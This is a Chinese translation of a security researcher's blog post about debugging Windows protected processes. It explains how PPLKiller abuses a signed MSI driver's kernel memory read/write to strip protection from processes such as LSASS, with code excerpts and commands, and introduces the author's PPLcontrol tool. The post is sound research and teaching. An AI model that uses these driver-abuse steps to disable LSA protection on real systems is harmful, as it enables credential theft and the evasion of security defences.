> Source: <https://itm4n.github.io/debugging-protected-processes/>

# 调试受保护的进程"  

每当我需要调试受保护的进程时，我通常会在内核中禁用保护，以便可以附加用户模式调试器。这个方法一直效果不错，直到某种程度上它让我陷入了困境。

## 受保护进程的问题

调试时受保护的进程的问题，基本上在于它们是受保护的。玩笑开完了，这意味着，即使你拥有管理员、`SYSTEM`、`TrustedInstaller`或独角兽权限，你也无法将用户模式调试器附加到它们上。虽然这种保护仅适用于用户模式，但仍有不同的方法来解决这个问题：

- 使用内核调试器；
- 使用（或利用）驱动程序来__禁用目标进程的保护__；
- 使用（或利用）驱动程序来__在用户模式调试器上设置任意的保护级别__。

我不太喜欢使用内核调试器，因为它需要一台第二台机器。你也可以选择本地内核调试，但它的限制很大，因为你不能设置断点。

第二种方法是我迄今为止使用的方法，感谢[PPLKiller](https://github.com/RedCursorSecurityConsulting/PPLKiller)。每次我需要出于研究目的调试受保护的进程时，我都会使用其`disablePPL`子命令来禁用保护。

然而，如果不够小心，这种技术可能会适得其反。它可能会在内核级别引起进程行为的重要变化，直到你发现~~你新的闪亮漏洞在实际条件下不起作用~~这种保护毕竟并非完全无用。它还可能触发_PatchGuard_，导致蓝屏死机，错误为`CRITICAL_STRUCTURE_CORRUPTION`。

因此，为你的调试器设置任意的保护级别似乎是更好的方法，因为对目标进程的影响仅限于调试本身。已经有一些项目，如[pplib](https://github.com/notscimmy/pplib)，正是这样做的，但我想借此机会学习一些东西，将它们实现到自定义工具中，并在过程中记录下来。

## PPLKiller如何禁用PPL保护？

首先，我在这里讨论的是[@aceb0nd](https://twitter.com/aceb0nd)开发的[PPLKiller](https://github.com/RedCursorSecurityConsulting/PPLKiller)，而不是[Mattiwatti](https://github.com/Mattiwatti)开发的较旧的[PPLKiller](https://github.com/Mattiwatti/PPLKiller)，后者完全作为内核模式驱动程序实现。

简要介绍一下，[PPLKiller](https://github.com/RedCursorSecurityConsulting/PPLKiller)是一款最初开发用于__绕过LSA保护__的工具（见原博文[这里](https://redcursor.com.au/bypassing-lsa-protection-aka-protected-process-light-without-mimikatz-on-windows-10/)）。为此，它利用了__合法的MSI驱动程序__，该驱动程序暴露了两个有趣的例程，一个用于__从任意内存区域读取__，另一个用于__写入任意内存区域__。这些“功能”被用作读/写原语，用于定位内核内存中的目标进程对象并禁用其保护。

要使用该工具，首先需要使用命令`PPLKiller.exe /installDriver`安装MSI驱动程序。然后，可以使用以下命令之一。

1. `PPLKiller.exe /disablePPL <LSASS_PID>`
2. `PPLKiller.exe /disableLSAProtection`

选项`/disableLSAProtection`执行的操作与`/disablePPL <LSASS_PID>`相同，只不过它会自动检索LSASS进程的PID。然后将目标PID作为参数传递给函数`disableProtectedProcesses(...)`，同时传递一个自定义结构（稍后会详细介绍）。

```cpp
// 来源: https://github.com/RedCursorSecurityConsulting/PPLKiller/blob/master/main.cpp
int wmain(int argc, wchar_t* argv[]) {
    // ...
    if (wcscmp(argv[1] + 1, L"disablePPL") == 0 && argc == 3) {
        Offsets offsets = getVersionOffsets();
        auto PID = _wtoi(argv[2]);
        disableProtectedProcesses(PID, offsets);
    }
    else if (wcscmp(argv[1] + 1, L"disableLSAProtection") == 0) {
        Offsets offsets = getVersionOffsets();
        auto lsassPID = processPIDByName(L"lsass.exe");
        disableProtectedProcesses(lsassPID, offsets);
    }
    // ...
    return 0;
}
```

禁用给定PID进程的保护可能如下所示。

```console
C:\Temp>PPLKiller.exe /disablePPL 644
PPLKiller 0.2版 由@aceb0nd提供
[+] 找到Windows 2009版本
[*] 已获取设备对象句柄
[*] Ntoskrnl基址: FFFFF80220600000
[*] PsInitialSystemProcess地址: FFFFE38E99E85040
[*] 当前进程地址: FFFFE38EA2E8B080
```

函数`disableProtectedProcesses()`首先打开设备`\\.\RTCore64`，这是在加载（64位）驱动程序时自动创建的设备。它将使用此句柄通过[`DeviceIoControl`](https://learn.microsoft.com/en-us/windows/win32/api/ioapiset/nf-ioapiset-deviceiocontrol)API向其发送命令。

```cpp
void disableProtectedProcesses(DWORD targetPID, Offsets offsets) {
    // 1. 打开设备 \\.\RTCore64
    const auto Device = CreateFileW(LR"(\\.\RTCore64)", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
    // ...
}
```

然后，它调用内部函数`getKernelBaseAddr()`，通过[`EnumDeviceDrivers`](https://learn.microsoft.com/en-us/windows/win32/api/psapi/nf-psapi-enumdevicedrivers)API获取Windows内核的地址。确实，这个API返回系统中每个设备驱动程序的加载地址，Windows内核是第一个条目。

```cpp
void disableProtectedProcesses(DWORD targetPID, Offsets offsets) {
    // ...
    // 2. 获取Windows内核基址
    const auto NtoskrnlBaseAddress = getKernelBaseAddr();
    Log("[*] Ntoskrnl基址: %p", NtoskrnlBaseAddress);
    // ...
}
```

现在，请做好准备，因为接下来的步骤可能会让你感到困惑，除非你已经是一个经验丰富的内核（利用）开发人员。它加载了内核镜像`ntoskrnl.exe`，使用`LoadLibraryW`，并使用API`GetProcAddress`获取`PsInitialSystemProcess`的地址，这甚至不是一个过程的名称。有点困惑吧？

```cpp
void disableProtectedProcesses(DWORD targetPID, Offsets offsets) {
    // ...
    // 3. 确定PsInitialSystemProcess的内核地址
    HMODULE Ntoskrnl = LoadLibraryW(L"ntoskrnl.exe");
    const DWORD64 PsInitialSystemProcessOffset = reinterpret_cast<DWORD64>(GetProcAddress(Ntoskrnl, "PsInitialSystemProcess")) - reinterpret_cast<DWORD64>(Ntoskrnl);
    FreeLibrary(Ntoskrnl);
    const DWORD64 PsInitialSystemProcessAddress = ReadMemoryDWORD64(Device, NtoskrnlBaseAddress + PsInitialSystemProcessOffset);
    Log("[*] PsInitialSystemProcess地址: %p", PsInitialSystemProcessAddress);
    // ...
}
```

好吧，让我们反思一下。首先，`LoadLibrary(Ex)(A/W)`可以加载_库模块（.dll文件）或可执行模块（.exe文件）_（[文档](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya#parameters)）。由于`ntoskrnl.exe`是一个可移植可执行（PE），因此该操作完全有效。然后，`PsInitialSystemProcess`是指向`EPROCESS`结构的指针。因此，它不是一个函数，但它仍然是一个导出的符号，因此可以通过`GetProcAddress`检索其地址。

通过从`ntoskrnl.exe`的__虚拟基址__中减去`PsInitialSystemProcess`的__虚拟地址__，我们获得了其__偏移量__。然后可以将该偏移量加到__内核基址__中，以获取其在内核内存中的实际地址。

在这一点上，你可能会问自己，为什么这个`PsInitialSystemProcess`符号如此重要。符号[`PsInitialSystem

Process`](https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/mm64bitphysicaladdress)是指向内核中初始`System`进程的`EPROCESS`结构的指针。在此结构中，可以找到一个[`LIST_ENTRY`](https://learn.microsoft.com/en-us/windows/win32/api/ntdef/ns-ntdef-list_entry)结构，称为`ActiveProcessLinks`，它是双向链表的“头”条目。

![System Informer - Initial System process](https://itm4n.github.io/assets/posts/2022-12-04-debugging-protected-processes/01_systeminformer-initial-system-process.png)

从那里，它遍历进程列表，并使用__读__原语提取每个`EPROCESS`条目的PID，直到找到目标条目。

```cpp
void disableProtectedProcesses(DWORD targetPID, Offsets offsets) {
    // ...
    // 4. 查找表示目标进程的内核对象
    const DWORD64 TargetProcessId = static_cast<DWORD64>(targetPID);
    DWORD64 ProcessHead = PsInitialSystemProcessAddress + offsets.ActiveProcessLinksOffset;
    DWORD64 CurrentProcessAddress = ProcessHead;
    do {
        const DWORD64 ProcessAddress = CurrentProcessAddress - offsets.ActiveProcessLinksOffset;
        const auto UniqueProcessId = ReadMemoryDWORD64(Device, ProcessAddress + offsets.UniqueProcessIdOffset);
        if (UniqueProcessId == TargetProcessId) {
            break;
        }
        CurrentProcessAddress = ReadMemoryDWORD64(Device, ProcessAddress + offsets.ActiveProcessLinksOffset);
    } while (CurrentProcessAddress != ProcessHead);
    CurrentProcessAddress -= offsets.ActiveProcessLinksOffset;
    Log("[*] 当前进程地址: %p", CurrentProcessAddress);
    // ...
}
```

最后，一旦知道了`EPROCESS`结构的基址，它会在`SignatureLevel`成员的偏移量处__写入4个空字节__，但为什么要这样做呢？

```cpp
void disableProtectedProcesses(DWORD targetPID, Offsets offsets) {
    // ...
    // 5. 将保护级别设置为0x00（=无保护）
    WriteMemoryPrimitive(Device, 4, CurrentProcessAddress + offsets.SignatureLevelOffset, 0x00);
    // ...
}
```

“受保护进程”的概念是在Windows Vista中引入的。当时，保护级别被存储为一个__位__（`ProtectedProcess`成员）。从Windows 8.1开始，我们有了__PP(L)__和__签名者类型__的概念，这要求改变结构。因此，现在保护级别存储在`Protection`成员中，这是一个`PS_PROTECTION`结构。

虽然术语“结构”有点夸张，但它实际上是一个单一的__字节__，其中__前四位__（从左到右）表示__签名者类型__，而__最后3位__表示__保护类型__（无，PPL或PP）。

```cpp
typedef struct _PS_PROTECTION {
    union {
        UCHAR Level;
        struct {
            UCHAR Type   : 3;
            UCHAR Audit  : 1; // 保留
            UCHAR Signer : 4;
        };
    };
} PS_PROTECTION, *PPS_PROTECTION;
```

因此，在`SignatureLevel`的偏移量处写入4个空字节会将这些4个属性设置为零。

```cpp
typedef struct _EPROCESS {
    // ...
    UCHAR SignatureLevel;        // 1 字节
    UCHAR SectionSignatureLevel; // 1 字节
    PS_PROTECTION Protection;    // 1 字节
    UCHAR HangCount;             // 1 字节
    // ...
} EPROCESS;
```

在Alex Ionescu撰写的文章[受保护进程第三部分：Windows PKI 内部（签名级别、场景、根密钥、EKU和运行时签名者）](https://www.alex-ionescu.com/?p=146)中，你可以阅读以下内容。

> _\[...\] 此外，与保护级别不同，保护级别是一个用于确定谁可以对进程执行哪些操作的进程范围的值，__签名级别__实际上被细分为__EXE签名级别__（`EPROCESS`中的“SignatureLevel”字段）以及__DLL签名级别__（`EPROCESS`结构中的“SectionSignatureLevel”字段）。前者由代码完整性用于验证主模块二进制文件的签名级别，后者用于设置磁盘上DLL的最小签名级别，以便允许加载到进程中。_

可以总结如下。

| 属性 | 描述 |
| --- | --- |
| 保护级别 | 谁可以打开进程（关于其保护）？ |
| 签名级别 | 主可执行文件的签名是否正常？ |
| 区段签名级别 | 加载的DLL是否正确签名？ |

那么，覆盖这三个值是否相关？答案是“视情况而定”。这取决于你是仅仅想打开一个PP(L)，还是想将一个未签名的DLL注入其中。在这里，我们可能只需要覆盖__保护级别__字节，因为我们只是想附加一个调试器。

好的，所以整体思路似乎非常清楚，除了一个问题。工具如何确定`EPROCESS`结构的不同成员的偏移量？简短的回答是：“它没有”。像许多其他工具一样，它有一组硬编码值，并在运行时检索操作系统版本以确定使用哪些值。

## 在运行时确定偏移量

在我的案例中，使用硬编码偏移量就足够了，因为我的目的是开发一个工具，允许我在受控环境中调试受保护的进程，以进行研究。我并不是在编写一个需要非常可靠的攻击工具，特别是当涉及到内核时。

尽管如此，我并不太喜欢这个主意。所以，我想知道在运行时动态查找这些偏移量有多困难。再一次，我对这些内核概念相对较新，因此很可能有更好的方法来做到这一点，我可能在这里重新发明了轮子。

对于我们的需求，我们需要确定`EPROCESS`结构中3个成员的偏移量：`UniqueProcessId`、`Protection`和`ActiveProcessLinks`。那么，让我们看看如何解决这个问题。

### `UniqueProcessId`成员

在NT内核中有一个名为`PsGetProcessId`的例程，它确实做了它名字所说的事情。它返回由`Process`参数引用的`EPROCESS`结构的`UniqueProcessId`。

```cpp
HANDLE PsGetProcessId(PEPROCESS Process) {
    return Process->UniqueProcessId;
}
```

在x86_64汇编中，这看起来像这样。

```nasm
mov  rax,qword ptr [rcx + 0x440] ; 48 8b 81 40 04 00 00
ret                              ; c3
```

因此，我们可以简单地加载`ntoskrnl.exe`镜像，调用`GetProcAddress`以获取`PsGetProcessId`的地址，并从字节码中简单提取偏移量（这里是`0x440`）。

### `Protection`成员

类似于`PsGetProcessId`，有两个（未记录的）例程，`PsIsProtectedProcess`和`PsIsProtectedProcessLight`，它们检查`Protection`成员的值，以确定给定进程是否为PP(L)。

```cpp
BOOL PsIsProtectedProcess(PEPROCESS Process) {
    // 如果保护类型是PP或PPL，则返回TRUE
    return Process->Protection.Type != PsProtectedTypeNone;
}

BOOL PsIsProtectedProcessLight(PEPROCESS Process) {
    // 如果保护类型仅为PPL，则返回TRUE
    return Process->Protection.Type == PsProtectedTypeProtectedLight;
}
```

再次，我们可以使用相同的方法从字节码中提取`Protection`成员的偏移量。

```nasm
; PsIsProtectedProcess
test  byte ptr [rcx + 0x87a],0x7 ; f6 81 7a 08 00 00 07
; PsIsProtectedProcessLight
mov   dl,byte ptr [rcx + 0x87a]  ; 8a 91 7a 08 00 00
```

### `ActiveProcessLinks`成员

至于`ActiveProcessLinks`，可能会稍微复杂一些。可能没有明显的例程只查询此结构成员而不进行更多复杂操作。

但是，如果我们仔细观察`EPROCESS`结构，我们可以看到以下内容。

```cpp
typedef struct _EPROCESS {
    // ...
    HANDLE UniqueProcessId;
    LIST_ENTRY ActiveProcessLinks;
    // ...
} EPROCESS;
```

至少，从Windows XP到Windows 10/11，`ActiveProcessLinks`位于`UniqueProcessId`之后。而且，我们已经有办法确定`UniqueProcessId`的偏移量。如果我们只是做出合理的假设，这在不久的将来不会改变，我们可以简单地将`sizeof(HANDLE)`，即`8`（64位）或`4`（32位），添加到`UniqueProcessId`的偏移量中，我们应该就没

问题了。

## 测试时间

我在一个工具中实现了这种方法：[PPLcontrol](https://github.com/itm4n/PPLcontrol)。它提供了一些基本功能，例如列出当前运行的受保护进程，获取特定进程的保护级别，或设置任意的保护级别。

首先，使用`list`命令枚举所有受保护的进程。

```console
C:\Temp>PPLcontrol.exe list

    PID | Level   | Signer
 -------+---------+----------------
      4 | PP  (2) | WinSystem (7)
    108 | PP  (2) | WinSystem (7)
    392 | PPL (1) | WinTcb (6)
    520 | PPL (1) | WinTcb (6)
    600 | PPL (1) | WinTcb (6)
    608 | PPL (1) | WinTcb (6)
    756 | PPL (1) | WinTcb (6)
   2092 | PP  (2) | WinSystem (7)
   3680 | PPL (1) | Antimalware (3)
   5840 | PPL (1) | Antimalware (3)
   7264 | PPL (1) | Windows (5)
   9508 | PP  (2) | WinTcb (6)
   1744 | PPL (1) | Windows (5)

[+] 枚举了13个受保护的进程。
```

例如，我们可以看到PID为`1744`的进程是一个PPL，签名者类型为`Windows`。通常，如果我们尝试将用户模式调试器附加到此进程，我们会收到以下错误。

![附加到受保护的进程会导致“访问被拒绝”。](https://itm4n.github.io/assets/posts/2022-12-04-debugging-protected-processes/02_windbg-attach-ppl-ko.png)

所以现在，让我们将保护PPL / `WinTcb`应用于我们的`WinDbg.exe`进程。作为旁注，我选择了这个签名者类型，因为它大于签名者类型`Windows`，但我也可以设置相同类型（但不能设置较低的值）。

```console
C:\Temp>tasklist | findstr /i windbg
windbg.exe                   10592 Console                    1     32,748 K

C:\Temp>PPLcontrol.exe protect 10592 PPL WinTcb
[+] 保护级别PPL-WinTcb已应用于PID为10592的进程，先前的保护级别为：None-None。

C:\Temp>PPLcontrol.exe get 10592
[+] PID为10592的进程是一个PPL，签名者类型为WinTcb (6)。
```

让我们再尝试将WinDbg附加到该进程。

![从受保护的调试器附加到受保护的进程有效。](https://itm4n.github.io/assets/posts/2022-12-04-debugging-protected-processes/03_windbg-attach-ppl-ok.png)

搞定！在没有对目标进程进行任何修改的情况下，我们现在可以将用户模式调试器附加到它。

## 结论

显然，我来晚了。通过滥用内核驱动程序禁用受保护进程的技术已经被人们知晓多年了。保护用户模式调试器以允许其调试受保护进程也不是什么新鲜事。实际上，早在今年早些时候的文章[调试无法调试的进程并在Microsoft Defender for Endpoint中发现CVE](https://medium.com/falconforce/debugging-the-undebuggable-and-finding-a-cve-in-microsoft-defender-for-endpoint-ce36f50bb31)中就已经简要讨论过这个问题。

然而，我认为还没有一篇博文像我这样记录这些基础概念。所以，如果你从中学到了一些东西，那对我来说就足够了。

## 链接与资源

- 绕过LSA保护（又名受保护进程轻量版）而无需Mimikatz在Windows 10上  
  [https://redcursor.com.au/bypassing-lsa-protection-aka-protected-process-light-without-mimikatz-on-windows-10/](https://redcursor.com.au/bypassing-lsa-protection-aka-protected-process-light-without-mimikatz-on-windows-10/)  
- GitHub - PPLKiller  
  [https://github.com/RedCursorSecurityConsulting/PPLKiller](https://github.com/RedCursorSecurityConsulting/PPLKiller)
- 受保护进程第三部分：Windows PKI 内部（签名级别、场景、根密钥、EKU和运行时签名者）  
  [https://www.alex-ionescu.com/?p=146](https://www.alex-ionescu.com/?p=146)
- 调试无法调试的进程并在Microsoft Defender for Endpoint中发现CVE  
  [https://medium.com/falconforce/debugging-the-undebuggable-and-finding-a-cve-in-microsoft-defender-for-endpoint-ce36f50bb31](https://medium.com/falconforce/debugging-the-undebuggable-and-finding-a-cve-in-microsoft-defender-for-endpoint-ce36f50bb31)

